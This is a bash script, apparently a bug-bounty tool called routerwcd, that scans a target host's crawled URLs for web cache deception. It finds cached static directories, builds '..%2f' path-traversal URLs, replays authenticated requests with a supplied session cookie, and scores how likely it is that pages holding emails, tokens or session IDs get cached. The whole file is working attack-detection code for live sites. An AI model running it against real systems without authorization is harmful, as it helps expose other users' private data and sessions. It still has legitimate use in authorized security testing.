#!/bin/bash

function routerfunc() {

	levelurl=$(echo "$directory_cache_rule" | sed -E s'/https?:\/\/[^/]*\///' | tr -s '/' '\n' | grep -v 'routerwcd' | wc -l)
	hostandpath=$(echo "$directory_cache_rule" | sed s'/\/routerwcd/ /'| cut -d ' ' -f1)

	num=$levelurl

	str=""

	for i in $(seq 1 $num)
	do
		str+="..%2f"
	done

	hostandpath_with_dotsegments+=$(echo "$hostandpath/$str@")

}

if [ $# -eq 0 -o $# -eq 1 -a "$1" = "-h" ]
then
echo "ooooooooo.                             .                      oooooo   oooooo     oooo   .oooooo.   oooooooooo.   "
echo "\`888   \`Y88.                         .o8                       \`888.    \`888.     .8'   d8P'  \`Y8b  \`888'   \`Y8b  "
echo " 888   .d88'  .ooooo.  oooo  oooo  .o888oo  .ooooo.  oooo d8b   \`888.   .8888.   .8'   888           888      888 "
echo " 888ooo88P'  d88' \`88b \`888  \`888    888   d88' \`88b \`888\"\"8P    \`888  .8'\`888. .8'    888           888      888 "
echo " 888\`88b.    888   888  888   888    888   888ooo888  888         \`888.8'  \`888.8'     888           888      888 "
echo " 888  \`88b.  888   888  888   888    888 . 888    .o  888          \`888'    \`888'      \`88b    ooo   888     d88' "
echo "o888o  o888o \`Y8bod8P'  \`V88V\"V8P'   \"888\" \`Y8bod8P' d888b          \`8'      \`8'        \`Y8bood8P'  o888bood8P'   "
echo "                                                                                                                  "
echo "[ by: foorw1nner | x.com/foorw1nner | hackerone.com/foorw1nner | github.com/foorw1nner ]"

	echo
	echo "[buffers] | routerwcd.sh -host yourtarget.com [flags]"
	echo "+===========================================================+"
	echo
	echo "-h		   Show This Help Message      "
	echo
	echo "-host		   -host yourtarget.com		"
	echo "-setcookie	   -setcookie \"Cookie: session=2vv07IdA37Npc1imvN2lQV0ZghMaxSSa\""
	echo "-setcontinue 	   -setcontinue (yes|no) | Stay on target after finding a discrepancy? Default: yes"
    	echo "-setmatch	   -setmatch \"Email|UserID|Token|PHPSESSID\""
	echo
	echo "+===========================================================+"

###STEP1
elif [ $# -ge 2 -a "$1" = "-host" ] && echo "$2" | grep -qE "^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$"
then
	###STORED YOUR CRAWLER IN list ###
	list=()
	while IFS= read -r line
	do
		list+=("$line")
	done

	echo -e "\033[31m+====================================================================================+\033[0m"
	echo -e "\033[32mSTEP 1: LOOKING FOR CACHE RULES IN THE DIRECTORIES [/static/, /assets/, /images/, /scripts/ and /resources/]\033[0m"
	echo -e "\033[31m+====================================================================================+\033[0m"

	hostset=$(echo "$2" | sed s'/^www\.//')
	for url in "${list[@]}"
	do
		static_directories+=$(echo "$url" | grep -Ei "^https?://www\.$hostset/|^https?://$hostset/" | grep -E "^https?://[^?=]*/static/" | sed s'/\/static\//\/static\/routerwcd@#/' | cut -d '#' -f1)
		static_directories+=$(echo "$url" | grep -Ei "^https?://www\.$hostset/|^https?://$hostset/" | grep -E "^https?://[^?=]*/assets/" | sed s'/\/assets\//\/assets\/routerwcd@#/' | cut -d '#' -f1)
		static_directories+=$(echo "$url" | grep -Ei "^https?://www\.$hostset/|^https?://$hostset/" | grep -E "^https?://[^?=]*/images/" | sed s'/\/images\//\/images\/routerwcd@#/' | cut -d '#' -f1)
		static_directories+=$(echo "$url" | grep -Ei "^https?://www\.$hostset/|^https?://$hostset/" | grep -E "^https?://[^?=]*/scripts/" | sed s'/\/scripts\//\/scripts\/routerwcd@#/' | cut -d '#' -f1)
		static_directories+=$(echo "$url" | grep -Ei "^https?://www\.$hostset/|^https?://$hostset/" | grep -E "^https?://[^?=]*/resources/" | sed s'/\/resources\//\/resources\/routerwcd@#/' | cut -d '#' -f1)
	done

	for url	in $(echo "$static_directories" | tr -s '@' '\n' | sort -u)
	do
		###SEARCHING CACHE RULES IN DIRECTORIES (MISS|HIT) directories/routerwcd
		request_dir=$(curl -Lisk "$url")
		if [ -n "$request_dir" ]
		then

			only_endresp=$(echo "$request_dir" | grep -n "^HTTP/" | sed -n '$p' | cut -d ':' -f1)
			if cache=$(echo "$request_dir" | sed -n "$only_endresp,\$p" | grep -Ei '^[A-Za-z-]+((-Cache:|-Cache-Status:|-Varnish:|-Cache-Server:|-Cache-Provider:|-Cache-Lookup:|-Cache-Int:)\s(hit|miss))|^Server-Timing:\s.*desc=(miss|hit)')
			then
				if echo "$cache" | grep -iq "miss"
				then
					echo -e "[$url] \033[32m[MISS]\033[0m"
					for i in $(seq 1 2)
					do
						request_dir=$(curl -Lisk "$url")
						sleep 3
					done

					if [ -n "$request_dir" ]
					then

						only_endresp=$(echo "$request_dir" | grep -n "^HTTP/" | sed -n '$p' | cut -d ':' -f1)
						cache=$(echo "$request_dir" | sed -n "$only_endresp,\$p" | grep -Ei '^[A-Za-z-]+((-Cache:|-Cache-Status:|-Varnish:|-Cache-Server:|-Cache-Provider:|-Cache-Lookup:|-Cache-Int:)\s(hit|miss))|^Server-Timing:\s.*desc=(miss|hit)')

						if echo "$cache" | grep -iq "hit"
						then
							directory_cache_rule=$url
							echo -e "[$url] \033[32m[MISS -> HIT]\033[0m"
							routerfunc
						fi
					fi
				###This else is for any occasion in which the first request falls into HIT instead of MISS
				else
					###Make a draw at the end of the cd router (unpredictable hash) to find MISS in the first request
					sorthash=$(echo {a..z}{0..9} | tr -s ' ' '\n'  | shuf | head -n 5 | tr -s '\n' '0')
					modified_url=$(echo "$url" | sed s"/\/routerwcd/\/routerwcd_$sorthash/")

					request_dir=$(curl -Lisk "$modified_url")

					if [ -n "$request_dir" ]
					then

						only_endresp=$(echo "$request_dir" | grep -n "^HTTP/" | sed -n '$p' | cut -d ':' -f1)
						if cache=$(echo "$request_dir" | sed -n "$only_endresp,\$p" | grep -Ei '^[A-Za-z-]+((-Cache:|-Cache-Status:|-Varnish:|-Cache-Server:|-Cache-Provider:|-Cache-Lookup:|-Cache-Int:)\s(hit|miss))|^Server-Timing:\s.*desc=(miss|hit)')
						then
							if echo "$cache" | grep -iq "miss"
							then

								echo -e "[$modified_url] \033[32m[MISS]\033[0m"
								for i in $(seq 1 2)
								do
									request_dir=$(curl -Lisk "$modified_url")
									sleep 3
								done

								if [ -n "$request_dir" ]
								then

									only_endresp=$(echo "$request_dir" | grep -n "^HTTP/" | sed -n '$p' | cut -d ':' -f1)
									cache=$(echo "$request_dir" | sed -n "$only_endresp,\$p" | grep -Ei '^[A-Za-z-]+((-Cache:|-Cache-Status:|-Varnish:|-Cache-Server:|-Cache-Provider:|-Cache-Lookup:|-Cache-Int:)\s(hit|miss))|^Server-Timing:\s.*desc=(miss|hit)')

									if echo "$cache" | grep -iq "hit"
									then
										directory_cache_rule=$modified_url
										echo -e "[$modified_url] \033[32m[MISS -> HIT]\033[0m"
										routerfunc
									fi
								fi
							fi
						fi
					fi
				fi
			else
				echo -e "[$url] \033[31m[NO-CACHE]\033[0m"
			fi
		else
			echo -e "[$url] \033[31m[NO-CONNECTION]\033[0m"
		fi
	done

	###STEP2
	if [ -n "$hostandpath_with_dotsegments" ]
	then
		echo
		echo -e "\033[31m+====================================================================================+\033[0m"
		echo -e "\033[32mPATHS WITH CACHE RULES:\033[0m"	
		for i in $(echo "$hostandpath_with_dotsegments" | tr -s '@' '\n')
		do
			echo "$i" | sed -E s'/https:\/\/[^/]*\///' | sed s'/^/\//' | sed s'/\.\.%2f/ /' | cut -d ' ' -f1
		done
		echo -e "\033[31m+====================================================================================+\033[0m"
		echo
		echo -e "\033[31m+====================================================================================+\033[0m"
		echo -e "\033[32mSTEP 2: DETECTING NORMALIZATION BY THE ORIGIN SERVER\033[0m"
		echo -e "\033[31m+====================================================================================+\033[0m"

		####INIT PARAMETERS CALC
		parameters=$(echo "$*" | tr -s ' ' '\n' | grep -E "^\-(host|setcookie|setcontinue|setmatch)$" | grep -n "^\-")

		if echo "$parameters" | grep -q "\-setcookie"
		then
			position_cookie=$(echo "$parameters" | grep "\-setcookie" | cut -d ':' -f1)
			position_cookie_value=$(expr $position_cookie + $position_cookie)
			setcookie=${!position_cookie_value}
		fi

		if echo "$parameters" | grep -q "\-setcontinue"
		then
			position_continue=$(echo "$parameters" | grep "\-setcontinue" | cut -d ':' -f1)
			position_continue_value=$(expr $position_continue + $position_continue)
			setcontinue=${!position_continue_value}
		fi

		if echo "$parameters" | grep -q "\-setmatch"
		then
			position_match=$(echo "$parameters" | grep "\-setmatch" | cut -d ':' -f1)
			position_match_value=$(expr $position_match + $position_match)
			setmatch=${!position_match_value}
		fi
		
		###INIT FINISH FASE
		crawler_clean=()
		for x in "${list[@]}"
		do
			crawler_clean+=$(echo "$x" | grep -Ei "(^https?://www\.$hostset/|^https?://$hostset/)[A-Za-z0-9_-]+" | grep -Eiv "^https?://[^?=]*/(static|assets|images|resources|scripts)/" | grep -Eiv "^https?://[^?=]*\.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|icon|pdf|svg|txt|js|txt|webp)" | grep "\." | sed s'/$/@/')
		done

		if [ -n "$crawler_clean" ]
		then

			for y in $(echo "$crawler_clean" | tr -s '@' '\n' | shuf | head -n50)
			do
				request_original=$(curl -Lski "$y" -H "$setcookie")
				if [ -n "$request_original" ]
				then
					path_original=$(echo "$y" | sed -E s'/https:\/\/[^/]*\///')

					for z in $(echo "$hostandpath_with_dotsegments" | tr -s '@' '\n')
					do
						request_with_router=$(curl -Lski "$z$path_original" -H "$setcookie")
						if [ -n "$request_with_router" ]
						then

							only_body1=$(cat -e <<< "$request_original" | grep -n "^\^M\\$\$" | sed -n '$p' | cut -d ':' -f1)
							only_body2=$(cat -e <<< "$request_with_router" | grep -n "^\^M\\$\$" | sed -n '$p' | cut -d ':' -f1)

							md5_request_original=$(echo "$request_original" | sed -n "$only_body1,\$p" | md5sum)
							md5_request_with_router=$(echo "$request_with_router" | sed -n "$only_body2,\$p" | md5sum)

							echo -e "[$y] \033[31m[$md5_request_original]\033[0m"
							echo -e "[$z$path_original] \033[31m[$md5_request_with_router]\033[0m"
							probability="0"

							if [ "$md5_request_original" = "$md5_request_with_router" ]
							then
								###INIT CALC PROBABILITY
								
								only_endresp=$(echo "$request_original" | grep -n "^HTTP/" | sed -n '$p' | cut -d ':' -f1)
								if ! echo "$request_original" | sed -n "$only_endresp,\$p" | grep -qEi '^[A-Za-z-]+((-Cache:|-Cache-Status:|-Varnish:|-Cache-Server:|-Cache-Provider:|-Cache-Lookup:|-Cache-Int:)\s(hit|miss))|^Server-Timing:\s.*desc=(miss|hit)'
								then
									
									only_endresp=$(echo "$request_with_router" | grep -n "^HTTP/" | sed -n '$p' | cut -d ':' -f1)
									if echo "$request_with_router" | sed -n "$only_endresp,\$p" | grep -qEi '^[A-Za-z-]+((-Cache:|-Cache-Status:|-Varnish:|-Cache-Server:|-Cache-Provider:|-Cache-Lookup:|-Cache-Int:)\s(hit|miss))|^Server-Timing:\s.*desc=(miss|hit)'
									then
										###DISCREPANCY DETECTED +50% PROBABILITY
										probability="50"

										sleep 2s

										setmatch_status="\033[31mNO\033[0m"
										if [ -n "$setmatch" ] && echo "$request_with_router" | sed -n "$only_endresp,\$p" | grep -qEi "$setmatch"
										then
											###SETMATCH DETECTED +45% PROBABILITY
											probability=$(expr $probability + 45)
											setmatch_status="\033[32mYES\033[0m"
										fi

										sleep 2s

										page404_status="\033[31mYES\033[0m"
										if ! echo "$request_with_router" | sed -n "$only_endresp,\$p" | head -n1 | grep -q '404'
										then
											###NOT A 404 PAGE +4% PROBABILITY
											probability=$(expr $probability + 4)
											page404_status="\033[32mNO\033[0m"
										fi
									
										echo -e "[$z$path_original] \033[32m[DISCREPANCY DETECTED]\033[0m [SETMATCH: $setmatch_status] [404 PAGE: $page404_status] [PROBABILITY VULN: \033[32m$probability%\033[0m]"
									fi
								fi
							fi
						fi
					done
				fi

				if [ -n "$setcontinue" ]
				then

					if [ "$setcontinue" = "no" ]
					then
						if [ "$probability" -ge 50 ]
						then
							exit
						fi
					else
						continue
					fi

				fi
							
			done
		fi
				
	else
			echo -e "\033[31m+====================================================================================+\033[0m"
			echo -e "\033[31mNO STATIC DIRECTORIES WERE FOUND WITH CACHE HEADERS\033[0m"
			echo -e "\033[31m+====================================================================================+\033[0m"
	fi

else
	$0
fi
